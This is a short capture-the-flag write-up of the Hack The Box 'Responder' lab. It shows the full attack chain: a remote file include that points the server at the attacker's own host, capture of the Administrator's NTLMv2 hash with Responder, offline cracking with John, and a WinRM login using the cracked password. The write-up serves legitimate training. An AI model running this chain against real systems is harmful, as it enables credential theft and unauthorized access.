# HTB - Responder (Tier 1)
**Difficulty:** Very Easy
**OS:** Windows

## Tools Used
- nmap
- responder
- john (John the Ripper)
- evil-winrm
- Browser

## Steps
1. Connected Kali VM to HTB network via OpenVPN
2. Ran `nmap -sV <IP>` — found port 80 (Apache) open
3. Added `unika.htb` to `/etc/hosts` to resolve the domain
4. Opened `http://unika.htb` in browser — found language 
   switcher using `?page=` parameter
5. Identified RFI vulnerability via the `page` parameter
6. Started Responder: `sudo responder -I tun0`
7. Triggered RFI by visiting: 
   `http://unika.htb/index.php?page=//<tun0_IP>/somefile`
8. Responder captured Administrator's NTLMv2 hash
9. Saved hash to file, cracked with John:
   `john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt`
10. Password found: `badminton`
11. Connected via WinRM: 
    `evil-winrm -i <IP> -u administrator -p badminton`
12. Navigated to `C:\Users\mike\Desktop`, read `flag.txt`

## What I Learned
- Always add custom domains to `/etc/hosts` for HTB machines
- LFI (Local File Include) loads files from the server itself using path traversal (../)
- RFI (Remote File Include) tricks the server into loading a file from an attacker's machine
- RFI vulnerabilities can be used to capture NTLM hashes
- Responder intercepts authentication attempts on the network
- NTLMv2 hashes can be cracked offline using wordlists
- WinRM (port 5985) allows remote CLI access to Windows machines
